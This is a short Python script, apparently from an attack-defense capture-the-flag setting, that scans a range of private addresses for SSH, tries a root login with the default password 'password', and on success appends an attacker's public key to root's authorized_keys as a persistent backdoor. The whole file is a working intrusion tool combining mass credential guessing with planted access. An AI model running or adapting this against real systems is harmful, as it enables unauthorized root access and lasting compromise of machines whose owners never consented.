from pwn import *
import nmap

def main():
    # key
    key = file("../keys/noma.pub").read()

    # Get IP addresses to test
    n = nmap.PortScanner()
    res = n.scan("172.16.0-10.*", "22")
    op = []
    for i in res["scan"]:
        if res["scan"][i]["tcp"][22]["state"] == "open":
            op.append(i)

    # Test if the password is default
    for i in op:
        try:
            conn = ssh(user="root", host=i, password="password")

            # Upload
            conn.shell("mkdir /root/.ssh;touch /root/.ssh/authorized_keys;grep amon /root/.ssh/authorized_keys || (echo %s | base64 -d) >> /root/.ssh/authorized_keys" % key.encode("base64").replace("\n", ""))

            log.success("%s succeeded" % i)
        except:
            log.info("%s failed" % i)


if __name__ == "__main__":
    main()
